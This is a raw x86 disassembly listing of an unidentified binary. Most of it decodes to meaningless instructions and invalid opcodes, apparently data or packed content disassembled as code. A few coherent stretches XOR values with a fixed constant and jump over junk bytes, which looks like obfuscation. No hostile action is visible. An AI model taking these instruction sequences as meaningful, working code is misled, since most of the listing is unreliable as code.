  414fe5:	xor    ecx,DWORD PTR [eax]
  414fe7:	or     BYTE PTR [edx+0x1c],0x71
  414feb:	lock inc ebx
  414fed:	test   DWORD PTR [ebp+0x12c3daf6],ebp
  414ff3:	adc    DWORD PTR [esi+0x36fc6bf4],ecx
  414ff9:	ss dec ebx
  414ffb:	xlat   BYTE PTR ds:[ebx]
  414ffc:	mov    ebx,eax
  414ffe:	adc    al,BYTE PTR [esi]
  415000:	fcmovb st,st(0)
  415002:	push   edi
  415003:	mov    esp,DWORD PTR [ecx+0x4f739ce6]
  415009:	inc    edi
  41500a:	ins    DWORD PTR es:[edi],dx
  41500b:	shr    DWORD PTR [ebx+0x33],1
  41500e:	ret    0xf0ec
  415011:	(bad)  
  415012:	out    dx,eax
  415013:	out    dx,eax
  415014:	inc    edx
  415015:	push   ebx
  415016:	es add al,0x5d
  415019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41501a:	dec    ecx
  41501b:	jb     0x414ff5
  41501d:	mov    edi,0x1d9e5786
  415022:	dec    ebp
  415023:	mov    edi,DWORD PTR [esi-0x6711a698]
  415029:	dec    eax
  41502a:	sbb    al,0xcd
  41502c:	mov    cl,0x30
  41502e:	pop    ss
  41502f:	aaa    
  415030:	stos   BYTE PTR es:[edi],al
  415031:	ins    DWORD PTR es:[edi],dx
  415032:	lods   eax,DWORD PTR ds:[esi]
  415033:	test   DWORD PTR [ebp-0x53734f92],0x41fc1e1e
  41503d:	push   esi
  41503e:	(bad)  
  415040:	daa    
  415041:	imul   edx,esi,0xffffff8f
  415044:	and    esp,esi
  415046:	cmp    ebp,ebx
  415048:	add    DWORD PTR [esi+0x3f],esp
  41504b:	aam    0x63
  41504d:	mov    dl,0x1a
  41504f:	xor    dh,BYTE PTR [eax-0x315eddf1]
  415055:	iret   
  415056:	stos   BYTE PTR es:[edi],al
  415057:	sbb    DWORD PTR [edi],0x9e859c4f
  41505d:	(bad)  
  41505e:	fwait
  41505f:	pusha  
  415060:	adc    al,0xf2
  415062:	rcl    eax,cl
  415064:	in     eax,dx
  415065:	stos   BYTE PTR es:[edi],al
  415066:	neg    DWORD PTR [edx+0x2e96bb41]
  41506c:	dec    esp
  41506d:	or     al,0x12
  41506f:	xchg   DWORD PTR [edx-0x3f614b3a],esi
  415075:	popf   
  415076:	inc    ecx
  415077:	jl     0x415076
  415079:	ror    DWORD PTR [edx+0x7],cl
  41507c:	(bad)  [ebx+0xd08cf50]
  415082:	ror    BYTE PTR [edi+0x35dcaea],0xbc
  415089:	es ja  0x415027
  41508c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41508d:	xchg   ebx,eax
  41508e:	into   
  41508f:	xchg   esp,eax
  415090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415091:	pop    ecx
  415092:	mov    ?,WORD PTR ds:0xd80960fb
  415098:	jne    0x415034
  41509a:	int    0xf6
  41509c:	nop
  41509d:	popf   
  41509e:	cmp    DWORD PTR [edx-0x2],edi
  4150a1:	sub    BYTE PTR [ecx],al
  4150a3:	jmp    0xaa1e:0x8d420ad8
  4150aa:	clc    
  4150ab:	inc    edi
  4150ac:	int    0xd7
  4150ae:	lea    ebx,[ebx-0x1]
  4150b1:	xchg   ecx,eax
  4150b2:	jmp    0x4374:0xe4c0f912
  4150b9:	pop    ss
  4150ba:	sub    eax,0xe4f8b48f
  4150bf:	mov    cl,BYTE PTR [ebx+0x28]
  4150c2:	mov    esp,0x5122b16f
  4150c7:	cmp    ah,BYTE PTR [edi+0x3cf800d5]
  4150cd:	sahf   
  4150ce:	lods   eax,DWORD PTR ds:[esi]
  4150cf:	pop    es
  4150d0:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4150d2:	pusha  
  4150d3:	out    dx,eax
  4150d4:	out    dx,al
  4150d5:	adc    esp,ecx
  4150d7:	icebp  
  4150d8:	jne    0x415094
  4150da:	xor    edi,edi
  4150dc:	xchg   BYTE PTR [ebx+0x3dcb04bd],bl
  4150e2:	cmc    
  4150e3:	push   edx
  4150e4:	mov    ch,0xd7
  4150e6:	call   edx
  4150e8:	mov    dh,0x3e
  4150ea:	mov    cl,BYTE PTR [ebx-0x1d5b854c]
  4150f0:	out    0x87,eax
  4150f2:	sbb    al,0x9
  4150f4:	inc    edi
  4150f5:	sbb    edi,ecx
  4150f7:	cwde   
  4150f8:	add    ecx,edx
  4150fa:	and    edx,DWORD PTR [ebx+eiz*1]
  4150fd:	jge    0x41510c
  4150ff:	sub    ah,BYTE PTR [ecx+0x48]
  415102:	jp     0x4150d2
  415104:	call   0x8a59:0xa335381e
  41510b:	lea    edi,[esi]
  41510d:	stos   DWORD PTR es:[edi],eax
  41510e:	retf   0xbd
  415111:	shr    BYTE PTR [si-0x7bfb],0xcb
  415117:	(bad)  
  415119:	sbb    eax,0xa8336da9
  41511e:	mov    ah,0x9a
  415120:	lods   al,BYTE PTR ds:[esi]
  415121:	jmp    0xd6cbdf99
  415126:	scas   al,BYTE PTR es:[edi]
  415127:	dec    eax
  415128:	xor    DWORD PTR [ebx-0x56e686bc],edx
  41512e:	test   al,0xf4
  415130:	ds mov ebp,0x40549b07
  415136:	mov    esp,0xc8bb7182
  41513b:	pusha  
  41513c:	cmp    edx,eax
  41513e:	cld    
  41513f:	xor    cl,BYTE PTR [edx]
  415141:	ficomp WORD PTR [edi+esi*4-0x31]
  415145:	push   0x1bdd76d
  41514a:	in     eax,0x65
  41514c:	mov    eax,0xffa5f186
  415151:	ins    DWORD PTR es:[edi],dx
  415152:	(bad)  
  415153:	in     eax,0x18
  415155:	cmc    
  415156:	fiadd  WORD PTR [edi+0x3c0c56c7]
  41515c:	dec    eax
  41515d:	fcomp  DWORD PTR [eax+0x0]
  415160:	or     al,BYTE PTR [ebp-0x64ec544]
  415166:	sub    ch,cl
  415168:	(bad)  
  415169:	stos   DWORD PTR es:[edi],eax
  41516a:	pop    edi
  41516b:	test   al,0x50
  41516d:	fnstsw WORD PTR [esi+0x2a]
  415170:	inc    ebx
  415171:	xor    ecx,DWORD PTR [esi]
  415173:	fwait
  415174:	(bad)  
  415175:	fisubr WORD PTR [edi-0x5f]
  415178:	out    dx,eax
  415179:	fild   WORD PTR [eax]
  41517b:	into   
  41517c:	xchg   esp,ecx
  41517e:	dec    esp
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	(bad)  
  4151a5:	xchg   edi,eax
  4151a7:	out    dx,al
  4151a8:	in     eax,dx
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	xchg   DWORD PTR [ebx+0x23bbcd86],esi
  4151b6:	data16 ja 0x4151ea
  4151b9:	xchg   edx,eax
  4151ba:	(bad)  
  4151bb:	mov    ds:0x4db803c3,eax
  4151c0:	jge    0x415179
  4151c2:	cmp    esp,DWORD PTR [edi]
  4151c4:	gs pop ebp
  4151c6:	inc    eax
  4151c7:	rcr    edi,0x55
  4151ca:	dec    ecx
  4151cb:	aas    
  4151cc:	pushf  
  4151cd:	jae    0x4151a2
  4151cf:	inc    edx
  4151d0:	addr16 push es
  4151d2:	enter  0xcabf,0xcc
  4151d6:	cmp    eax,0xe7c17248
  4151db:	mov    bh,0x72
  4151dd:	nop
  4151de:	and    BYTE PTR [edi+0x49216131],ah
  4151e4:	xor    ebp,ebp
  4151e6:	ins    BYTE PTR es:[edi],dx
  4151e7:	scas   eax,DWORD PTR es:[edi]
  4151e8:	sbb    al,0xcc
  4151ea:	pop    edi
  4151eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ec:	ins    BYTE PTR es:[edi],dx
  4151ed:	jecxz  0x4151e9
  4151ef:	cs xchg ebp,eax
  4151f1:	shr    BYTE PTR [edi+0x64ea4bb1],cl
  4151f7:	sub    edi,DWORD PTR [edx+0x67]
  4151fa:	ror    DWORD PTR [ebx+0x46],1
  4151fd:	xor    eax,0x907b7f35
  415202:	outs   dx,BYTE PTR ds:[esi]
  415203:	cmp    BYTE PTR [ebx-0x75a65033],dh
  415209:	test   eax,0x37b85e67
  41520e:	fs pusha 
  415210:	into   
  415211:	jnp    0x41520a
  415213:	rcr    BYTE PTR [edi+0x38],cl
  415216:	sub    bl,dl
  415218:	popf   
  415219:	pushf  
  41521a:	push   0xfffffff6
  41521c:	dec    ebx
  41521d:	(bad)  
  41521e:	jnp    0x415213
  415220:	xchg   ebp,eax
  415221:	dec    eax
  415222:	stc    
  415223:	pusha  
  415224:	scas   eax,DWORD PTR es:[edi]
  415225:	pop    ds
  415226:	jp     0x4151c0
  415228:	je     0x415273
  41522a:	adc    DWORD PTR [ecx+0x38],eax
  41522d:	jae    0x415281
  41522f:	inc    esp
  415230:	sub    esp,DWORD PTR [esi+ebp*2+0x3430851d]
  415237:	ss aas 
  415239:	xchg   DWORD PTR es:[edi+0xf],edx
  41523d:	into   
  41523e:	cmp    BYTE PTR [edx],bh
  415240:	mov    ecx,0xe41a8b23
  415245:	mov    ebp,0x389eb3e2
  41524a:	add    BYTE PTR [ebx],dh
  41524c:	shl    BYTE PTR [ebx+0x46707321],cl
  415252:	push   edi
  415253:	ins    BYTE PTR es:[edi],dx
  415254:	inc    eax
  415255:	data16 sbb al,0xbc
  415258:	lea    ecx,[ebp-0x71eeb6b2]
  41525e:	sub    DWORD PTR [ecx-0x3caf3ee7],edx
  415264:	lea    ebx,[ebx+0x6aa4ed1d]
  41526a:	mov    bl,0x9
  41526c:	add    bl,ah
  41526e:	addr16 inc eax
  415270:	fimul  WORD PTR [edx]
  415272:	pushf  
  415273:	mov    esi,0xa985a64
  415278:	xlat   BYTE PTR ds:[ebx]
  415279:	jmp    0xe14c8489
  41527e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41527f:	push   ebx
  415280:	dec    ebx
  415281:	mov    al,ds:0x1adcd61b
  415287:	jecxz  0x415264
  415289:	jmp    0xcc2e:0xea645404
  415290:	loop   0x4152a9
  415292:	push   esp
  415293:	cmp    al,0x13
  415295:	jecxz  0x415299
  415297:	xor    al,0xd6
  415299:	sbb    eax,0x88d76c46
  41529e:	sub    bh,bl
  4152a0:	mov    edx,0xcf6b5e36
  4152a5:	sbb    DWORD PTR [eax-0x35f28010],0x564edd68
  4152af:	test   BYTE PTR ds:0x9890455b,bl
  4152b5:	push   ecx
  4152b6:	pop    ecx
  4152b7:	or     ebp,DWORD PTR [ebx]
  4152b9:	xor    edx,DWORD PTR [ebp+0x55efa9bd]
  4152bf:	or     edx,DWORD PTR [edx-0x12]
  4152c2:	shr    DWORD PTR [eax+0x48],1
  4152c5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4152c7:	mov    edx,0x3551e0b9
  4152cc:	sbb    dl,ch
  4152ce:	sbb    ebp,eax
  4152d0:	and    al,0x6e
  4152d2:	and    esp,DWORD PTR ds:0x2a7cade8
  4152d8:	xlat   BYTE PTR ds:[ebx]
  4152d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152da:	(bad)  
  4152db:	jo     0x4152bf
  4152dd:	or     al,0xed
  4152e0:	xlat   BYTE PTR ds:[ebx]
  4152e1:	and    ch,ah
  4152e3:	(bad)  
  4152e4:	fld    TBYTE PTR [esi-0x54]
  4152e7:	xchg   edx,ecx
  4152e9:	add    BYTE PTR [esp+eiz*8-0x39],ah
  4152ed:	sbb    ch,ch
  4152ef:	or     eax,DWORD PTR [esi+0x5b034ba6]
  4152f5:	add    DWORD PTR [edx],0x53
  4152f8:	inc    edx
  4152f9:	or     bl,BYTE PTR [edi]
  4152fb:	loope  0x41534f
  4152fd:	cmp    ebp,esp
  4152ff:	jmp    0x415292
  415301:	dec    edi
  415302:	cwde   
  415303:	push   ecx
  415304:	imul   edi,DWORD PTR [edx],0x2c
  415307:	fistp  QWORD PTR [ecx-0x3abbc109]
  41530d:	(bad)  
  41530f:	and    cl,al
  415311:	clc    
  415312:	es mov ch,0x70
  415315:	lock jmp 0x9f33:0x1f345151
  41531d:	in     al,dx
  41531e:	mov    edx,DWORD PTR [eax+esi*4+0x3d]
  415322:	xor    DWORD PTR [ebx-0x21],esi
  415325:	(bad)  
  415326:	leave  
  415327:	xor    al,0xd7
  415329:	jl     0x4152f8
  41532b:	stc    
  41532c:	dec    edx
  41532d:	stos   BYTE PTR es:[edi],al
  41532e:	cmp    al,0xcb
  415330:	add    esi,ebx
  415332:	fcom   DWORD PTR ds:0x91db2bd1
  415338:	loopne 0x41536d
  41533a:	cmp    edx,DWORD PTR [ebp+0x1062ce9f]
  415340:	scas   al,BYTE PTR es:[edi]
  415341:	add    ah,BYTE PTR [eax]
  415343:	xor    ah,dh
  415345:	stos   BYTE PTR es:[edi],al
  415346:	xchg   esp,eax
  415347:	ds nop
  415349:	iret   
  41534a:	or     edx,DWORD PTR [esi]
  41534c:	mov    edx,0x26c2abd
  415351:	mov    bl,0xf8
  415353:	retf   0xe9b0
  415356:	leave  
  415357:	popf   
  415358:	scas   eax,DWORD PTR es:[edi]
  415359:	js     0x415338
  41535b:	fst    DWORD PTR [ebx+0x21]
  41535e:	and    DWORD PTR [edx],esp
  415360:	outs   dx,DWORD PTR cs:[esi]
  415362:	and    BYTE PTR [edi+0x6ea8308c],dh
  415368:	xor    BYTE PTR [ebx+eiz*2+0x5e],dl
  41536c:	loope  0x4152fe
  41536e:	xchg   ecx,eax
  41536f:	addr16 ret 
  415371:	jge    0x41533b
  415373:	adc    bh,BYTE PTR [eax+0x35]
  415376:	lea    edi,[esi-0x30]
  415379:	mov    eax,0xb3045e7c
  41537e:	xchg   edx,eax
  41537f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415380:	add    edx,DWORD PTR [ebx+0x1aaab6d4]
  415386:	js     0x415380
  415388:	push   ebp
  415389:	jo     0x4153e3
  41538b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41538c:	out    0x22,al
  41538e:	retf   0xe64d
  415391:	pusha  
  415392:	mov    dl,0x7e
  415394:	call   0xed40dd49
  415399:	test   DWORD PTR [esi-0x77990fe5],edx
  41539f:	mov    eax,0x48ac078c
  4153a4:	push   0xe8105b3e
  4153a9:	jmp    0x64d63dc3
  4153ae:	fidiv  DWORD PTR [edx+ebp*4-0x17]
  4153b2:	sub    eax,DWORD PTR [ebx+ebp*8-0x4d]
  4153b6:	cmp    DWORD PTR [ebx-0x11],esp
  4153b9:	jnp    0x4153de
  4153bb:	in     ax,0x39
  4153be:	imul   ebp,DWORD PTR [ebp-0x6c],0xbb5d7750
  4153c5:	add    BYTE PTR [eax-0x37],ah
  4153c8:	(bad)  
  4153c9:	repz xchg edi,eax
  4153cb:	push   ebp
  4153cc:	cld    
  4153cd:	sbb    edx,eax
  4153cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153d0:	sbb    eax,0xd5f863f3
  4153d5:	pop    ebp
  4153d6:	mov    dl,0x3c
  4153d8:	sub    DWORD PTR [esi+0x57a9ccd2],edi
  4153de:	out    dx,eax
  4153df:	imul   ecx,DWORD PTR [ebx-0x97d1c4d],0xffffff98
  4153e6:	add    eax,0x9ef26727
  4153eb:	aam    0xf0
  4153ed:	xor    BYTE PTR [edi],ah
  4153ef:	jl     0x4153e2
  4153f1:	push   0x5c31abda
  4153f6:	push   ds
  4153f7:	xchg   esp,eax
  4153f8:	adc    DWORD PTR [edi+0x19],eax
  4153fb:	jg     0x4153df
  4153fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153fe:	and    ecx,ecx
  415400:	mov    edx,0x2cd691da
  415405:	(bad)  
  415407:	cmc    
  415408:	inc    esi
  415409:	add    eax,0x4bfba081
  41540e:	mov    esi,0x60c706a1
  415413:	mov    ch,0x49
  415415:	mov    ch,0xd6
  415417:	fsub   DWORD PTR [ecx+ecx*1-0x1b]
  41541b:	inc    edi
  41541c:	mov    cs,WORD PTR [edi-0x33477ecf]
  415422:	call   0x1720:0x530f90b
  415429:	(bad)  
  41542a:	mov    gs,WORD PTR [esi-0x1b]
  41542d:	and    al,BYTE PTR [ecx]
  41542f:	outs   dx,BYTE PTR ds:[esi]
  415430:	xor    cl,BYTE PTR [ebx-0x2c]
  415433:	arpl   WORD PTR [edi+0x54348f41],cx
  415439:	into   
  41543a:	mov    edi,0x1a4039c7
  41543f:	lock pop ecx
  415441:	in     al,dx
  415442:	js     0x415403
  415444:	xchg   ebp,eax
  415445:	pop    ecx
  415446:	ret    
  415447:	test   BYTE PTR [eax+0x2f5b0de1],0x55
  41544e:	jp     0x415413
  415450:	adc    dh,BYTE PTR [eax+0x42]
  415453:	out    0xb4,eax
  415455:	sub    BYTE PTR [ebp+eax*1+0x38a67fbd],cl
  41545c:	xchg   edi,eax
  41545d:	jnp    0x4153e4
  41545f:	cmp    eax,0x82e548d4
  415464:	fs out 0x6b,al
  415467:	test   al,0x75
  415469:	(bad)  
  41546a:	daa    
  41546b:	pushf  
  41546c:	pop    DWORD PTR [ecx-0x61]
  41546f:	or     ecx,DWORD PTR [ebp-0xbbc9380]
  415475:	mov    eax,ds:0x89c20331
  41547a:	inc    ebp
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xfc
  4154c8:	push   eax
  4154c9:	xchg   ebx,eax
  4154ca:	(bad)  
  4154cc:	add    bh,BYTE PTR [edi+0x70]
  4154cf:	mov    ecx,0x3970707e
  4154d4:	scas   eax,DWORD PTR es:[edi]
  4154d5:	int    0x5e
  4154d7:	loopne 0x41549e
  4154d9:	aaa    
  4154da:	das    
  4154db:	cmc    
  4154dc:	cmp    BYTE PTR [esi+ecx*4-0x3d],dl
  4154e0:	add    eax,0xc7102ad9
  4154e5:	pop    ebp
  4154e6:	xchg   ebx,eax
  4154e7:	or     edi,DWORD PTR [esi+0x121ea12e]
  4154ed:	jmp    0x415478
  4154ef:	rcr    esp,cl
  4154f1:	cmp    ah,BYTE PTR [edx+0x1425cb2]
  4154f7:	call   0x959ed10b
  4154fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154fd:	push   edi
  4154fe:	test   al,0x2b
  415500:	in     al,dx
  415501:	dec    BYTE PTR [ecx+0x65]
  415504:	push   0x9038cd56
  415509:	nop
  41550a:	xchg   bl,ah
  41550c:	pop    ebx
  41550d:	mov    esi,0x8e914d65
  415512:	sar    DWORD PTR [ebp+0x506358b0],0x2c
  415519:	popf   
  41551a:	mov    BYTE PTR [ebx+0x3d33f39e],bh
  415520:	(bad)  
  415521:	mov    edx,0xf59f53ce
  415526:	mov    ch,0xc8
  415528:	jmp    0x415514
  41552a:	mov    esi,0x8e4c3831
  41552f:	call   0xf457:0xa330b472
  415536:	aad    0xd6
  415538:	in     al,dx
  415539:	mov    ebx,0x7b6d3a79
  41553e:	stos   BYTE PTR es:[edi],al
  41553f:	or     eax,0x2adf2bea
  415544:	adc    al,0x10
  415546:	xchg   esp,eax
  415547:	ss icebp 
  415549:	cmp    al,0x28
  41554b:	and    DWORD PTR [eax],0xffffff8e
  41554e:	jno    0x41552e
  415550:	mov    DWORD PTR [esi+0x72cd357f],0x5cf6cafb
  41555a:	xchg   edi,eax
  41555b:	test   BYTE PTR [ebx+eax*1+0x6a40a246],0x66
  415563:	outs   dx,BYTE PTR ds:[esi]
  415564:	mov    DWORD PTR ds:0xbe774f76,edi
  41556a:	adc    esi,DWORD PTR [ecx+edx*2-0x3a95086]
  415571:	mov    dl,0xf7
  415573:	push   cs
  415574:	jae    0x4155bd
  415576:	or     dl,ch
  415578:	ins    DWORD PTR es:[edi],dx
  415579:	pusha  
  41557a:	arpl   si,di
  41557c:	mov    ds:0x5bb74af8,al
  415581:	sbb    al,0xb9
  415583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415584:	stos   BYTE PTR es:[edi],al
  415585:	mov    ebp,0x7f43d2f1
  41558a:	push   ecx
  41558b:	out    0x37,al
  41558d:	call   0xdc4a9ed9
  415592:	push   ds
  415593:	xchg   esi,eax
  415594:	pop    esp
  415595:	leave  
  415596:	mov    bh,0x28
  415598:	adc    eax,0xf925f39f
  41559d:	cmp    dh,ch
  41559f:	bound  esi,QWORD PTR [ebp-0x4b20ba9a]
  4155a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155a6:	scas   al,BYTE PTR es:[edi]
  4155a7:	add    edx,DWORD PTR [edi+edx*8+0x8]
  4155ab:	ror    DWORD PTR ds:[edi+0x44bb1b36],cl
  4155b2:	push   cs
  4155b3:	add    eax,ebx
  4155b5:	or     BYTE PTR [esi+0x6b],0x74
  4155b9:	inc    edx
  4155ba:	or     eax,0x890a6580
  4155bf:	push   edi
  4155c0:	xchg   edi,eax
  4155c1:	push   0xfbc67c52
  4155c6:	sbb    eax,0xb837a2b9
  4155cb:	xor    al,0xef
  4155cd:	aam    0x60
  4155cf:	pop    edx
  4155d0:	inc    esp
  4155d1:	je     0x415573
  4155d3:	outs   dx,BYTE PTR ds:[esi]
  4155d4:	pop    esi
  4155d5:	sbb    DWORD PTR [ebp+0x37],eax
  4155d8:	rol    ecx,0x21
  4155db:	retf   
  4155dc:	pop    ecx
  4155dd:	sub    ch,cl
  4155df:	data16 shl BYTE PTR [edx-0x3d2aae19],0x43
  4155e7:	aaa    
  4155e8:	icebp  
  4155e9:	and    DWORD PTR [ebx-0x56],edi
  4155ec:	cdq    
  4155ed:	test   BYTE PTR [eax+0xdb11e9a],ah
  4155f3:	adc    al,0xc
  4155f5:	out    dx,eax
  4155f6:	and    DWORD PTR [edx-0x14d2447e],edi
  4155fc:	rcl    BYTE PTR [edi-0x2a],0x9c
  415600:	stos   DWORD PTR es:[edi],eax
  415601:	les    ebx,FWORD PTR [edi+0x4f]
  415604:	aaa    
  415605:	rcl    BYTE PTR [ebx],cl
  415607:	(bad)
  41560b:	fstp   QWORD PTR [ebp-0x63]
  41560e:	add    DWORD PTR [eax+0x3fc20f7],esi
  415614:	jmp    0x4155da
  415616:	xor    DWORD PTR [esi+0x5e],eax
  415619:	in     eax,0x8e
  41561b:	int3   
  41561c:	out    dx,eax
  41561d:	xor    al,0x82
  41561f:	pop    eax
  415620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415621:	jge    0x4155ed
  415623:	retf   0x4022
  415626:	xchg   DWORD PTR [esi-0x11],ebx
  415629:	jge    0x415659
  41562b:	mov    ?,WORD PTR [esi-0x7bef4d42]
  415631:	leave  
  415632:	jl     0x415668
  415634:	inc    edi
  415635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415636:	pop    ss
  415637:	cli    
  415638:	push   esp
  415639:	mov    BYTE PTR [ecx+0x55],bh
  41563c:	sti    
  41563d:	jp     0x4155eb
  41563f:	in     al,dx
  415640:	(bad)  
  415642:	cmp    bl,BYTE PTR [edi-0x7d19e3c3]
  415648:	push   0x6f96d17f
  41564d:	push   edx
  41564e:	mov    WORD PTR [eax-0x16],cs
  415651:	pop    es
  415652:	sbb    eax,0x1e0f7406
  415657:	fwait
  415658:	pop    ecx
  415659:	or     al,0xd0
  41565b:	push   ecx
  41565c:	aam    0x87
  41565e:	xlat   BYTE PTR ds:[ebx]
  41565f:	mov    edi,0xe5afafb8
  415664:	sbb    ebp,edx
  415666:	ficomp WORD PTR [ebx-0x710d95a8]
  41566c:	repz call 0x1861a9c5
  415672:	and    al,0xdc
  415674:	stc    
  415675:	enter  0x90d2,0x5d
  415679:	sbb    BYTE PTR [esi],0xbb
  41567c:	ret    
  41567d:	sub    eax,0x363d1c51
  415682:	adc    eax,0x6683cdd5
  415687:	push   ebp
  415688:	pop    ebp
  415689:	push   ss
  41568a:	fidivr DWORD PTR [edx]
  41568c:	push   esp
  41568d:	push   ecx
  41568e:	add    dh,ah
  415690:	and    al,0x8f
  415692:	and    esi,DWORD PTR [edi-0x5d]
  415695:	fistp  WORD PTR [edx]
  415697:	mov    ebx,0x803f2f0a
  41569c:	repz jae 0x415690
  41569f:	dec    ebp
  4156a0:	jle    0x415689
  4156a2:	sbb    eax,ebp
  4156a4:	inc    ebp
  4156a5:	jne    0x4156be
  4156a7:	test   al,0x1b
  4156a9:	sbb    BYTE PTR [ecx],bl
  4156ab:	lahf   
  4156ac:	stos   DWORD PTR es:[edi],eax
  4156ad:	clc    
  4156ae:	not    BYTE PTR [esi]
  4156b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b1:	inc    ebx
  4156b2:	mov    ch,0x87
  4156b4:	les    esi,FWORD PTR [edi+eiz*2+0x29]
  4156b8:	pop    edi
  4156b9:	adc    eax,DWORD PTR ds:0x71b4748e
  4156bf:	inc    eax
  4156c0:	jp     0x4156d6
  4156c2:	mov    ebx,0xbe7b7cc4
  4156c7:	add    eax,0xe8aae8eb
  4156cc:	adc    ebx,ebp
  4156ce:	dec    esi
  4156cf:	(bad)  
  4156d0:	test   DWORD PTR [edi],0x7e08134a
  4156d6:	(bad)  
  4156d7:	iret   
  4156d8:	(bad)  
  4156d9:	addr16 out 0xe6,al
  4156dc:	lods   al,BYTE PTR ds:[esi]
  4156dd:	dec    edx
  4156de:	mov    dh,0x75
  4156e0:	jl     0x4156e2
  4156e2:	dec    eax
  4156e3:	fiadd  WORD PTR ss:0x66281d68
  4156ea:	push   edx
  4156eb:	daa    
  4156ec:	call   0xe579:0x4d0ce5ee
  4156f3:	addr16 aaa 
  4156f5:	out    dx,eax
  4156f6:	pop    eax
  4156f7:	xchg   esi,eax
  4156f8:	fld    QWORD PTR [edi+eiz*4]
  4156fb:	or     al,0xd5
  4156fd:	enter  0xe0b0,0x70
  415701:	dec    edi
  415702:	fiadd  DWORD PTR [ebx+0x19]
  415705:	sub    eax,0xdc40df21
  41570a:	jae    0x41570f
  41570c:	add    al,0x50
  41570e:	shr    BYTE PTR [ecx-0x7da6f78],cl
  415714:	jae    0x4156b3
  415716:	shr    BYTE PTR [edi+eiz*8+0x29238312],cl
  41571d:	mov    ebp,0x9f01cb4
  415722:	mov    ebp,0x539e6b69
  415727:	ins    DWORD PTR es:[edi],dx
  415728:	ret    0x5c9c
  41572b:	xchg   esi,eax
  41572c:	sub    DWORD PTR [eax],esp
  41572e:	push   0xb
  415730:	and    BYTE PTR [edi-0x54],ch
  415733:	or     al,0x3c
  415735:	and    eax,0xed75d778
  41573a:	test   BYTE PTR [ebx],cl
  41573c:	(bad)  
  41573d:	jns    0x4156f3
  41573f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415740:	fistp  QWORD PTR [ebp+ecx*1+0x40e92c24]
  415747:	adc    al,0x14
  415749:	(bad)  
  41574a:	int3   
  41574b:	xchg   edi,eax
  41574c:	stos   DWORD PTR es:[edi],eax
  41574d:	inc    esp
  41574e:	sub    esi,DWORD PTR [ecx]
  415750:	das    
  415751:	lods   eax,DWORD PTR ds:[esi]
  415752:	mov    eax,ds:0xa2424ac9
  415757:	push   ds
  415758:	ret    0x8a26
  41575b:	cdq    
  41575c:	dec    ebp
  41575d:	and    BYTE PTR [edi],0x25
  415760:	push   ecx
  415761:	mov    BYTE PTR [eax],dl
  415763:	cld    
  415764:	xchg   ebx,eax
  415765:	sbb    dl,BYTE PTR [edi-0x74c92429]
  41576b:	adc    al,0x30
  41576d:	mov    ebp,esp
  41576f:	retf   
  415770:	inc    ebx
  415771:	jmp    DWORD PTR [edx+0x4b]
  415774:	mov    al,0x8f
  415776:	fs jmp 0x415721
  415779:	sbb    DWORD PTR [edi-0x6cc7207a],esi
  41577f:	ret    
  415780:	pushf  
  415781:	xchg   ebx,eax
  415782:	add    BYTE PTR [edx],ch
  415784:	mov    ch,0xeb
  415786:	mov    ebx,0x8d3ca50c
  41578b:	std    
  41578c:	jp     0x415749
  41578e:	sbb    al,0xbe
  415790:	cmp    ecx,0xbf68e3a9
  415796:	(bad)  
  415797:	sti    
  415798:	cmp    al,0x99
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   ch,ch
  4157b8:	xor    al,0x98
  4157ba:	call   0x7eb9:0x707f0f7f
  4157c1:	jo     0x415833
  4157c3:	sbb    edx,DWORD PTR [edi]
